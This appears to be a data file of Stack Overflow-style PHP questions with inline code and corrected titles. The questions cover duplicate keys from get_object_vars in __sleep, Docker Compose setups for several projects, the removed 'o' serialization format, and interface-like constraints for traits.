Duplicate array keys," The title may seem a bit silly but I'm totally serious with this. Today at work I came across a weird PHP behaviour which I could not explain. Luckily this behaviour is fixed in PHP 7.4, so it seems that someone stumbled upon that, too.I made a small example to illustrate what went wrong: Run this code here: https://3v4l.org/DBt3oHeres a bit explanation of what is going on here. We have to classes A and B which both share a property $a. Careful readers noticed, that the property $a has two different visibilities (public, private). Nothing fancy so far. The magic happens in the __sleep method which gets magically called when we serialize our instance. We want to have all object variables which we get with get_object_vars reduce this to only the keys with array_keys and output everything with var_dump.I would expect something like this (this happens since PHP 7.4 and is my expected output): But what I get is this: How could it be, that PHP delivers an array with two completely identical keys? Who is able to explain what happens here internally because in plain PHP I'm not able to generate an array with two completely identical keys? Or do I miss something obvious here?My coworkers did not want to believe me at first but none of them had a good explanation of this after they understood what is happening here.I really would love to see a good explanation. <code>  <?phpclass A { private $a = 'This is $a from A'; public $b = 'This is $b from A'; public function __sleep(): array { var_dump(array_keys(get_object_vars($this))); return []; }}class B extends A{ public $a = 'This is $a from B';}$b = new B;serialize($b); array(2) { [0]=> string(1) ""b"" [1]=> string(1) ""a""} array(3) { [0]=> string(1) ""a"" [1]=> string(1) ""b"" [2]=> string(1) ""a""}","Duplicate array keys (Notice: member variable ""a"" returned from __sleep() multiple times)"

Using docker for multiple php applications," I recently moved from Wamp (wampserver) to Docker (Windows host). While using wamp, I was able to have multiple projects like in following file structure On the wamp's Apache, I had defined a couple of virtual hosts, and all of the projects, used wamp's database, each one each own schema.So it was quite common within the day to switch context when necessary from project1, to project2 to project3 etc..by visiting either url like http://localhost/projectX or the corresponding virtual host.This does not seem so straight forward on Docker, as I have seen so far.My first approach was to have a distinct Docker set up on each project I think that this does not seem too efficient, compared to what I was used to using wamp, since every time I want to change context I have to use docker-compose stop the project I am currently working and docker-compose up to the project I want to switch to and vice versa.I tried another approach, to run all projects in a single apache-php container (the entire www folder) which would let me have all projects available at once, but with this approach, I face two serious issues.docker build is taking too long, probably because of the increased number of files, instead of smaller amount on a single projecti could not have more that one db schema initialized in mysql, so even though i managed to get 2 or 3 projects running, only 1 would be able to communicate with the corresponding db. My docker-compose file in the first approach looks like this while my docker-compose file in the second approach looks like this ref for mysql data persist Docker-Compose persistent data MySQL <code>  - wamp64 - www/ - project1/ - project2/ - .... - www/ - project1/ - dockerfile & docker-compose - project2/ - dockerfile & docker-compose - projectX/ - dockerfile & docker-compose- data // this is where mysql data lie - www/ dockerfile & docker-compose - project1/ - project2/ version: '3'services: project1: build: context: . // contents of specific project directory dockerfile: .docker/Dockerfile image: project1 ports: 80:80 volumes: .:/app/project1 links: mysql mysql: image: mysql:5.7 ports: 13306:3306 environment: MYSQL_DATABASE: docker MYSQL_USER: docker MYSQL_PASSWORD: docker MYSQL_ROOT_PASSWORD: docker volumes: - ../data:var/lib/mysql version: '3'services: web-project: build: context: . // contents of www directory dockerfile: .docker/Dockerfile image: web-project ports: 80:80 volumes: /project1:/app/project1 /project2:/app/project2 /projectX:/app/projectX links: mysql mysql: image: mysql:5.7 ports: 13306:3306 volumes: - /data:var/lib/mysql",Using Docker for multiple php applications

If I remove the post__not_in and tax_query arguments, it fills out, but obviously not with products from the same category.I want to show cross-sell products first, then the category-related products.

"What was PHP's ""o serialization format"" for?"," The list of backwards-incompatible changes for PHP 7.4 contain the following note:SerializationThe o serialization format has been removed. As it is never produced by PHP, this may only break unserialization of manually crafted strings.(Note that this is referring to a little-o, not the big-O format which is used for object serialization.)It seems this was never generated by PHP's serialize() function, but the fact that this note exists implies that it was recognised by the unserialize() function.I've done a little test fiddle (3v4l.org) which shows this was not simply a synonym for big-O, which would be one obvious possibility.The fiddle exposes the changes in PHP by the differences in the error message that is output. In PHP >= 7.4 we get an error at position 0 (where the o is encountered) whereas prior to 7.4 the error was reported at position 5 (where the data is located). This implies that o was recognised but the data is in the wrong format, which ties in with what I've already deduced, above.So, what was the o serialization format, what did it deserialize to and why did PHP support such a feature if it didn't actually generate it, itself? <code> ","What was PHP's ""o"" serialization format for?"

Is there something link interfaces for traits in PHP?," I often find myself wanting to be able to have a trait implement an interface, so that when I add the trait to a class, I can know the trait's requirements are met. For example, in Laravel I will create traits for many of my relationships like below: In the case of Laravel, I can be pretty well assured that every model I add this to will have a belongsTo method, however it still feels like I should be able to enforce this.The only way I know to enforce this is to support it with a HasOwnerInterface or HasRelationshipsInterface, but the fact that by failing to add that when I'm adding the trait prevents it squawking feels like having airbags in a car, but which you need to turn on every time you start the engine.This is what I think would be perfect: Is there another design pattern I should be using for this, or should I role up my sleeves and start fighting for this with the PHP core team to add this? <code>  trait HasOwner{ public function owner() { return $this->belongsTo(User::class); }} trait HasOwner expects RelationshipInterface{ public function owner() { return $this->belongsTo(User::class); }}interface RelationshipInterface{ public function belongsTo(Model $model): Relationship;}class Property implements RelationshipInterface{ use HasOwner;}",Is there something like interfaces for traits in PHP?
